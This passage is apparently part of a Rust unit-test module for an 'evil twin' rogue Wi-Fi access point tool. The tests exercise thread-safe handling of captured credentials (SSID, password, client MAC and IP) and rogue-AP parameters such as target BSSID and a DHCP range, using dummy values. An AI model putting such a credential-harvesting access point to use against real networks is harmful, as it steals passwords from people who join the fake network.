        assert_eq!(deserialized.ssid, "SerializeTest");
        assert!(deserialized.validated);
    }

    #[test]
    fn test_evil_twin_state_thread_safety() {
        use std::thread;

        let state = Arc::new(EvilTwinState::new());
        let state_clone = state.clone();

        let handle = thread::spawn(move || {
            state_clone.stop();
        });

        handle.join().unwrap();
        assert!(!state.running.load(Ordering::SeqCst));
    }

    #[test]
    fn test_evil_twin_state_concurrent_credential_access() {
        use std::thread;

        let state = Arc::new(EvilTwinState::new());
        let mut handles = vec![];

        for i in 0..10 {
            let state_clone = state.clone();
            let handle = thread::spawn(move || {
                let mut credentials = state_clone.captured_credentials.lock().unwrap();
                credentials.push(CapturedCredential {
                    ssid: format!("Net{}", i),
                    password: format!("pass{}", i),
                    client_mac: "AA:BB:CC:DD:EE:FF".to_string(),
                    client_ip: "192.168.1.100".to_string(),
                    timestamp: i as u64,
                    validated: false,
                });
            });
            handles.push(handle);
        }

        for handle in handles {
            handle.join().unwrap();
        }

        let credentials = state.captured_credentials.lock().unwrap();
        assert_eq!(credentials.len(), 10);
    }

    // =========================================================================
    // Validation Tests
    // =========================================================================

    #[test]
    fn test_bssid_format_valid() {
        let valid_bssids = [
            "AA:BB:CC:DD:EE:FF",
            "00:11:22:33:44:55",
            "aa:bb:cc:dd:ee:ff",
        ];

        for bssid in valid_bssids {
            let params = EvilTwinParams {
                target_bssid: Some(bssid.to_string()),
                ..Default::default()
            };
            assert!(params.target_bssid.is_some());
        }
    }

    #[test]
    fn test_ip_address_format() {
        let params = EvilTwinParams {
            gateway_ip: "192.168.1.1".to_string(),
            dhcp_range_start: "192.168.1.100".to_string(),
            dhcp_range_end: "192.168.1.200".to_string(),
            ..Default::default()
        };

        // Verify format is valid IPv4
        assert!(params.gateway_ip.split('.').count() == 4);
        assert!(params.dhcp_range_start.split('.').count() == 4);
        assert!(params.dhcp_range_end.split('.').count() == 4);
    }
}
